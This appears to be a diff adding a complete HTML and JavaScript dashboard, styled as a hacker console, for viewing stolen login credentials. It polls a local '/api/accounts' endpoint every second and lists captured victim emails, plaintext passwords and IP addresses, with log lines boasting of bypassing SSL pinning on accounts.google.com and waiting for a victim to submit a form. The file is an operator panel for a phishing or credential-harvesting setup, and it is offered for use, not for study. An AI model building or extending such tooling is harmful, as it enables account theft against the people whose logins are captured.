@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kartly Admin // Root Access</title>
+  <style>
+    :root {
+      --bg: #0a0e17;
+      --panel: #141b2d;
+      --border: #2a3b5c;
+      --text: #e2e8f0;
+      --text-muted: #94a3b8;
+      --accent: #10b981; 
+      --accent-glow: rgba(16, 185, 129, 0.2);
+      --danger: #ef4444;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Courier New', Courier, monospace;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .topbar {
+      background: var(--panel);
+      border-bottom: 1px solid var(--border);
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .logo { font-size: 18px; font-weight: bold; color: var(--accent); display: flex; align-items: center; gap: 10px; text-shadow: 0 0 10px var(--accent-glow); }
+    .status { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--accent); }
+    .blinking-dot { width: 8px; height: 8px; background: var(--accent); border-radius: 50%; animation: blink 1s infinite alternate; }
+    @keyframes blink { from { opacity: 0.3; box-shadow: 0 0 0 transparent; } to { opacity: 1; box-shadow: 0 0 8px var(--accent); } }
+    .topbar-stats { font-size: 13px; color: var(--text-muted); }
+    .topbar-stats span { color: var(--text); font-weight: bold; }
+    .container { display: flex; flex: 1; overflow: hidden; }
+    .sidebar { width: 350px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+    .panel-header { padding: 16px; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.2); }
+    .log-list { list-style: none; overflow-y: auto; flex: 1; }
+    .log-item { padding: 16px; border-bottom: 1px solid var(--border); cursor: pointer; transition: background 0.2s; }
+    .log-item:hover, .log-item.active { background: rgba(16, 185, 129, 0.05); border-left: 3px solid var(--accent); }
+    .log-item.active { padding-left: 13px; }
+    .log-time { font-size: 11px; color: var(--text-muted); margin-bottom: 4px; display: block; }
+    .log-email { font-size: 14px; color: var(--accent); word-break: break-all; }
+    .log-pass { font-size: 13px; color: var(--danger); margin-top: 4px; font-weight: bold; }
+    .main-panel { flex: 1; padding: 24px; display: flex; flex-direction: column; gap: 24px; overflow-y: auto; }
+    .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .data-box { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 20px; }
+    .data-box h4 { font-size: 12px; color: var(--text-muted); text-transform: uppercase; margin-bottom: 12px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
+    .data-value { font-size: 18px; color: #fff; font-family: monospace; word-break: break-all; margin-bottom: 8px; }
+    .data-label { font-size: 12px; color: var(--text-muted); }
+    .terminal { background: #000; border: 1px solid var(--border); border-radius: 6px; padding: 16px; font-family: monospace; font-size: 13px; color: #ccc; flex: 1; overflow-y: auto; }
+    .terminal-line { margin-bottom: 6px; }
+    .terminal-line.success { color: var(--accent); }
+    .terminal-line.info { color: #3b82f6; }
+    .terminal-line.warn { color: #eab308; }
+    .cursor { display: inline-block; width: 8px; height: 15px; background: var(--accent); animation: blink 1s step-end infinite; vertical-align: middle; }
+  </style>
+</head>
+<body>
+
+  <header class="topbar">
+    <div class="logo"><span>root@kartly-backend:~#</span></div>
+    <div class="status"><div class="blinking-dot"></div><span>LIVE SNIFFER ACTIVE</span></div>
+    <div class="topbar-stats">Captured: <span id="captureCount">0</span> | Server: <span>127.0.0.1</span></div>
+  </header>
+
+  <div class="container">
+    <div class="sidebar">
+      <div class="panel-header">Intercepted Credentials</div>
+      <ul class="log-list" id="logList"></ul>
+    </div>
+
+    <div class="main-panel">
+      <div class="data-grid">
+        <div class="data-box">
+          <h4>Selected Target Email</h4>
+          <div class="data-value" id="detailEmail">Waiting for data...</div>
+          <div class="data-label" id="detailIp">IP: --</div>
+        </div>
+        <div class="data-box">
+          <h4>Extracted Password</h4>
+          <div class="data-value" id="detailPass" style="color: var(--danger);">--</div>
+          <div class="data-label" id="detailTime">Time: --</div>
+        </div>
+      </div>
+
+      <div class="data-box" style="grid-column: 1 / -1; flex: 1; display: flex; flex-direction: column;">
+        <h4>System Logs</h4>
+        <div class="terminal" id="terminal">
+          <div class="terminal-line info">[SYSTEM] Initializing packet sniffer...</div>
+          <div class="terminal-line info">[SYSTEM] Bypassing SSL pinning on accounts.google.com</div>
+          <div class="terminal-line success">[SUCCESS] Listening on port 443.</div>
+          <div class="terminal-line warn">[WAITING] Waiting for victim to submit form...</div>
+          <div class="terminal-line"><br><span class="cursor"></span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let capturedData = [];
+    const logList = document.getElementById('logList');
+    const terminal = document.getElementById('terminal');
+    const captureCount = document.getElementById('captureCount');
+    const detailEmail = document.getElementById('detailEmail');
+    const detailPass = document.getElementById('detailPass');
+    const detailIp = document.getElementById('detailIp');
+    const detailTime = document.getElementById('detailTime');
+
+    function renderData() {
+      logList.innerHTML = '';
+      capturedData.forEach((data, index) => {
+        const li = document.createElement('li');
+        li.className = 'log-item';
+        if(index === 0) li.classList.add('active'); 
+        li.innerHTML = `
+          <span class="log-time">${data.time}</span>
+          <div class="log-email">${data.email}</div>
+          <div class="log-pass">${data.password}</div>
+        `;
+        li.onclick = () => selectItem(data, li);
+        logList.appendChild(li);
+      });
+      captureCount.textContent = capturedData.length;
+      if (capturedData.length > 0) {
+        selectItem(capturedData[0], logList.firstChild);
+      }
+    }
+
+    function selectItem(data, element) {
+      document.querySelectorAll('.log-item').forEach(el => el.classList.remove('active'));
+      if(element) element.classList.add('active');
+      detailEmail.textContent = data.email;
+      detailPass.textContent = data.password;
+      detailIp.textContent = `IP: ${data.ip}`;
+      detailTime.textContent = `Time: ${data.time}`;
+    }
+
+    // Live polling from the Python Backend
+    async function fetchData() {
+      try {
+        const response = await fetch('/api/accounts');
+        const newData = await response.json();
+        
+        // If a new credential arrived, update the UI
+        if (newData.length > capturedData.length) {
+          capturedData = newData;
+          renderData();
+          
+          const latest = capturedData[0];
+          const div = document.createElement('div');
+          div.className = `terminal-line success`;
+          div.innerHTML = `[INTERCEPT] POST /login HTTP/1.1<br>[CAPTURED] user: ${latest.email} | pass: ${latest.password}`;
+          
+          const cursor = terminal.querySelector('.cursor').parentElement;
+          terminal.insertBefore(div, cursor);
+          terminal.scrollTop = terminal.scrollHeight;
+        }
+      } catch (err) {
+        // Ignore if Python isn't running yet
+      }
+    }
+
+    // Check for new data every 1 second
+    setInterval(fetchData, 1000);
+    fetchData();
+  </script>
+</body>
+</html>
